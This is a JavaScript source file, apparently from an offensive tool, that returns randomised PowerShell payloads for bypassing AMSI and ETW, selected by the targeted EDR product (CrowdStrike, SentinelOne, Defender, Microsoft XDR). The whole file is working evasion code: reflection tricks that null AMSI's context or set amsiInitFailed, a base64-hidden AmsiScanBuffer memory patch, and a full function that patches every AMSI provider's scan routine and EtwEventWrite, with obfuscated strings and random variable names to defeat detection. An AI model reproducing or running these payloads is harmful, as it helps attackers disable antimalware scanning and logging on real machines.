// Generate a random string of specified length
function randomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Generate a random integer between 0 and max (inclusive)
function randomInt(max) {
    return Math.floor(Math.random() * (max + 1));
}

function getPayload(edr) {
    let memvar = randomString(3 + randomInt(7)); // Random variable name of length 3 to 10

    // Existing payloads for Random selection
    const ForceErrer = `#Unknown - Force error \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
    const MattGRefl = `#Matt Graebers Reflection method \n$${memvar}="System.Management.Automation.AmsiUtils";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',"NonPublic,Static").SetValue($null,$true);`;
    const MattGReflLog = `#Matt Graebers Reflection method with WMF5 autologging bypass \n$${memvar}="System.Management.Automation.AmsiUtils";[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
    const MattGref02 = `#Matt Graebers second Reflection method \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
    const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");

    // EDR-specific payloads
    const crowdStrikePayload = `#CrowdStrike AMSI and ETW Bypass\nfunction Invoke-NullAMSI {
    param
    (

        [Parameter(ParameterSetName = 'Interface',
                   Mandatory = $false,
                   Position = 0)]
        [switch]
        $v,

        [Parameter(ParameterSetName = 'Interface',
                   Mandatory = $false,
                   Position = 0)]
        [switch]
        $etw
    )

    # Verbose 
    if ($v) {
        $VerbosePreference="Continue"
    }

    ### Function based by Matt Graeber, Twitter: @mattifestation ###
    
    # Obtaining the address of a Winapi function using native functions with Reflection 
    function Get-Function
    {
        Param(
            [string] $module,
            [string] $function
        )
        $moduleHandle = $GetModule.Invoke($null, @($module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
        $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
    }

    # Get a delegate to be able to call Winapi functions with your address
    function Get-Delegate
    {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
            [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
            [Parameter(Position = 2)] [Type] $retType = [Void]
        )
        $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('QM', $false).
        DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
        $delegate = $type.CreateType()
        $marshalClass::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
    }

    Write-host "[*] Patching 4MSI" -ForegroundColor Cyan
    # Add WinForms assembly required
    try {
        Add-Type -AssemblyName System.Windows.Forms
    }
    catch {
        Throw "[!] Failed to add WinForms assembly"
    }

    $marshalClass = [System.Runtime.InteropServices.Marshal]

    # Obtain native methods
    $unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')

    # Strings "obfuscated" in Unicode bytes
    $bytesGetProc = [Byte[]](71, 0, 101, 0, 116, 0, 80, 0, 114, 0, 111, 0, 99, 0, 65, 0, 100, 0, 100, 0, 114, 0, 101, 0, 115, 0, 115, 0)
    $bytesGetMod =  [Byte[]](71, 0, 101, 0, 116, 0, 77, 0, 111, 0, 100, 0, 117, 0, 108, 0, 101, 0, 72, 0, 97, 0, 110, 0, 100, 0, 108, 0, 101, 0)

    # Get strings from Unicode bytes
    $GetProc = [Text.Encoding]::Unicode.GetString($bytesGetProc)
    $GetMod = [Text.Encoding]::Unicode.GetString($bytesGetMod)

    # Get GetModule address using native methods
    $GetModule = $unsafeMethodsType.GetMethod($GetMod)
    if ($GetModule -eq $null) {
        Throw "[!] Error getting the $GetMod address"
    }
    Write-Verbose "[*] Handle of ${GetMod}: $($GetModule.MethodHandle.Value)"

    # Get GetAddres address using native methods
    $GetAddres = $unsafeMethodsType.GetMethod($GetProc)
    if ($GetAddres -eq $null) {
        Throw "[!] Error getting the $GetProc address"
    }
    Write-Verbose "[*] Handle of ${GetProc}: $($GetAddres.MethodHandle.Value)"

    # "Same" technique as above
    $bytes4msiInit = [Byte[]](65, 0, 109, 0, 115, 0, 105, 0, 73, 0, 110, 0, 105, 0, 116, 0, 105, 0, 97, 0, 108, 0, 105, 0, 122, 0, 101, 0)
    $bytes4msi = [Byte[]](97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0)
    $4msi = [System.Text.Encoding]::Unicode.GetString($bytes4msi)
    $4msiInit = [System.Text.Encoding]::Unicode.GetString($bytes4msiInit)

    # Obtain the respective address from 4msi
    $4msiAddr = Get-Function $4msi $4msiInit
    if ($4msiAddr -eq $null) {
        Throw "[!] Error getting the $4msiInit address"
    }
    Write-Verbose "[*] Handle of ${4msiInit}: $4msiAddr"

    ### Patch method based by Maor Korkos (@maorkor) ###

    Write-Verbose "[*] Getting $4msiInit delegate"

    # We obtain the length in bytes of IntPtr. with this we will define variables depending if our PowerShell is 32 or 64 bits.
    # For 64 bits IntPtr is usually 8 bytes long.
    # For 32 bits IntPtr is usually 4 bytes long.
    $PtrSize = $marshalClass::SizeOf([Type][IntPtr])
    if ($PtrSize -eq 8) {
        $Initialize = Get-Delegate $4msiAddr @([string], [UInt64].MakeByRefType()) ([Int])
        [Int64]$ctx = 0
    } else {
        $Initialize = Get-Delegate $4msiAddr @([string], [IntPtr].MakeByRefType()) ([Int])
        $ctx = 0
    }

    # A little obfuscation
    $replace = 'Virt' + 'ualProtec'
    $name = '{0}{1}' -f $replace, 't'

    # Get VtProtect Address
    $protectAddr = Get-Function ("ker{0}.dll" -f "nel32") $name
    if ($protectAddr -eq $null) {
        Throw "[!] Error getting the $name address"
    }
    Write-Verbose "[*] Handle of ${name}: $protectAddr"

    # We obtain its delegate to be able to “invoke” or “call” the function
    $protect = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    Write-Verbose "[*] Getting $name delegate"

    # Declare varaibles
    $PAGE_EXECUTE_WRITECOPY = 0x00000080
    $patch = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
    $p = 0; $i = 0

    Write-Verbose "[*] Calling $4msiInit to recieve a new AMS1 Context"
    if ($Initialize.Invoke("Scanner", [ref]$ctx) -ne 0) {
        if ($ctx -eq 0) {
            Write-Host "[!] No provider found" -ForegroundColor Red
            return
        } else {
            Throw "[!] Error call $4msiInit"
        }
    }
    Write-host "[*] AMS1 context: $ctx" -ForegroundColor Cyan

    # Find the AntiMalwareProviders list in CAmsiAntimalware
    if ($PtrSize -eq 8) {
        $CAmsiAntimalware = $marshalClass::ReadInt64([IntPtr]$ctx, 16)
        $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64)
    } else {
        $CAmsiAntimalware = $marshalClass::ReadInt32($ctx+8)
        $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36)
    }

    # Loop provders
    Write-Verbose "[*] Patching all the providers"
    while ($AntimalwareProvider -ne 0)
    {

        # Find the provider's Scan function according to Powershell architecture
        if ($PtrSize -eq 8) {
            $AntimalwareProviderVtbl = $marshalClass::ReadInt64([IntPtr]$AntimalwareProvider)
            $AmsiProviderScanFunc = $marshalClass::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
        } else {
            $AntimalwareProviderVtbl = $marshalClass::ReadInt32($AntimalwareProvider)
            $AmsiProviderScanFunc = $marshalClass::ReadInt32($AntimalwareProviderVtbl + 12)
        }

        # We change the protection to be able to make the patch
        Write-Verbose "[*] Changing address $AmsiProviderScanFunc permissions to PAGE_EXECUTE_WRITECOPY"
        Write-host "[$i] Provider's scan function found: $AmsiProviderScanFunc" -ForegroundColor Cyan
        if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
            Throw "[!] Error changing the permissions of provider: $AmsiProviderScanFunc"
        }

        # Copy the bytes of the patch to the respective function
        try {
            $marshalClass::Copy($patch, 0, [IntPtr]$AmsiProviderScanFunc, 6)
        }
        catch {
            Throw "[!] Error writing patch in address:  $AmsiProviderScanFunc"
        }

        # We check if the function has the patch bytes
        for ($x = 0; $x -lt $patch.Length; $x++) {
            $byteValue = $marshalClass::ReadByte([IntPtr]::Add($AmsiProviderScanFunc, $x))
            if ($byteValue -ne $patch[$x]) {
                Throw "[!] Error when patching in the address: $AmsiProviderScanFunc"
            }
        }

        Write-Verbose "[*] Restoring original memory protection"
        if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $p, [ref]$p)) {
            Throw "[!] Failed to restore memory protection of provider: $AmsiProviderScanFunc"
        }

        $i++

        # We obtain the following provider if it exists
        if ($PtrSize -eq 8) {
            $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$PtrSize))
        } else {
            $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36 + ($i*$PtrSize))
        }
    }

    if ($etw) {
        # Same methodology as for the 4MSI bypass
        Write-host "[*] Patching ETW" -ForegroundColor Cyan
        $etwFunc = [System.Text.Encoding]::ASCII.GetString([Byte[]](0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65))

        $etwAddr = Get-Function ("nt{0}.dll" -f "dll") $etwFunc
        Write-Verbose "[*] Handle of ${etwFunc}: $etwAddr"
        if ($etwAddr -eq $null) {
            Throw "[!] Error getting the $etwFunc address"
        }

        Write-Verbose "[*] Changing $etwFunc permissions to PAGE_EXECUTE_WRITECOPY"
        if (!$protect.Invoke($etwAddr, 1, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
            Throw "[!] Error changing the permissions $etwFunc"
        }

        try {
            # RET patch, the function when called only returns
            if ($PtrSize -eq 8) {
                $marshalClass::WriteByte($etwAddr, 0xC3)
            } else {
                $patch = [byte[]] (0xb8, 0xff, 0x55)
                $marshalClass::Copy($patch, 0, [IntPtr]$etwAddr, 3)
            }
        }
        catch {
             Throw "[!] Error writing patch $etwFunc"
        }
        
        Write-Verbose "[*] Restoring original memory protection"
        if (!$protect.Invoke($etwAddr, 1, $p, [ref]$p)) {
            Throw "[!] Failed to restore memory protection of $etwFunc"
        }
        if ($PtrSize -eq 8) {
            $byteValue = $marshalClass::ReadByte([IntPtr]::Add($etwAddr, 0))
            if ($byteValue -ne 0xc3) {
                Throw "[!] Error when patching $etwFunc"
            }
        } else {
            for ($x = 0; $x -lt 3; $x++) {
                $byteValue = $marshalClass::ReadByte([IntPtr]::Add($etwAddr, $x))
                if ($byteValue -ne $patch[$x]) {
                    Throw "[!] Error when patching $etwFunc"
            }
        }
        }

        Write-Host "[*] Successful ETW patching" -ForegroundColor Green
    }

    Write-Host "[*] Successful providers patching, 4MSI patched" -ForegroundColor Green
}`;
    const microsoftXDRPayload = `#MicrosoftXDR AMSI Bypass (Placeholder) \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
    const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
    const defenderPayload = `#Defender AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;

    switch (edr) {
        case 'CrowdStrike':
            return crowdStrikePayload;
        case 'MicrosoftXDR':
            return microsoftXDRPayload;
        case 'SentinelOne':
            return sentinelOnePayload;
        case 'Defender':
            return defenderPayload;
        case 'Random':
        default:
            switch (randomInt(4)) {
                case 0:
                    return ForceErrer;
                case 1:
                    return MattGRefl;
                case 2:
                    return MattGReflLog;
                case 3:
                    return MattGref02;
                case 4:
                    return RastaBuf;
            }
    }
}
